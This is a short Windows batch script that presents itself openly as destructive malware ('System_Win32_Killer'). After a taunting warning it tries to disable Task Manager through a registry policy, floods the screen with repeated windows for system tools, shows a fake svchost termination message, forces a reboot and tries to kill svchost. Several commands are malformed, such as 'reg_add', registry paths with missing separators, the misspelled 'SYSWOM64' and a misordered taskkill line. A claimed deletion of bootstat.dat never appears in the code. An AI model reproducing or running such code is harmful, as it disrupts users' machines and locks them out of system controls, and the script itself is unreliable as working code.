@echo off
Title System_Win32_Killer by AlexVirusCiberneticos (CyberAlexMalw)
color a
echo Did you've executed a very destructive malware written on Batch Script, but is destructive to be a Batch Script.
echo This malware was made by fun to me, but I don't have intention of getting damage on computers, that's why I'm putting this warning.
echo Do you want to execute this malware? The creator will be not responsible for any damages. Do you've 10 seconds to restart your system.
echo Also, I forget to say, is that I'll disable Task Manager. And it'll delete bootstat.dat
timeout 10
reg_add "HKEY_CURRENT_USERSOFTWARE\MicrosoftWindows\CurrentVersion\PoliciesSystem"/v DisableTaskMgr /t REG_DWORD /d 1 /f
echo Try opening Task Manager :D
echo You can't destroy me! I'm inmortal, say goodbye at your pc!
start control
start C:
start System32
start SYSWOM64
start cmd
start regedit
start System32
start notepad
start control
start C:
start System32
start SYSWOM64
start cmd
start regedit
start System32
start notepad
start control
start C:
start System32
start SYSWOM64
start cmd
start regedit
start System32
start C:\Windows
shutdown -r -t 3 -c "Svchost.exe process has been terminated, succesfully."
taskkill /IM /f svchost.exe 
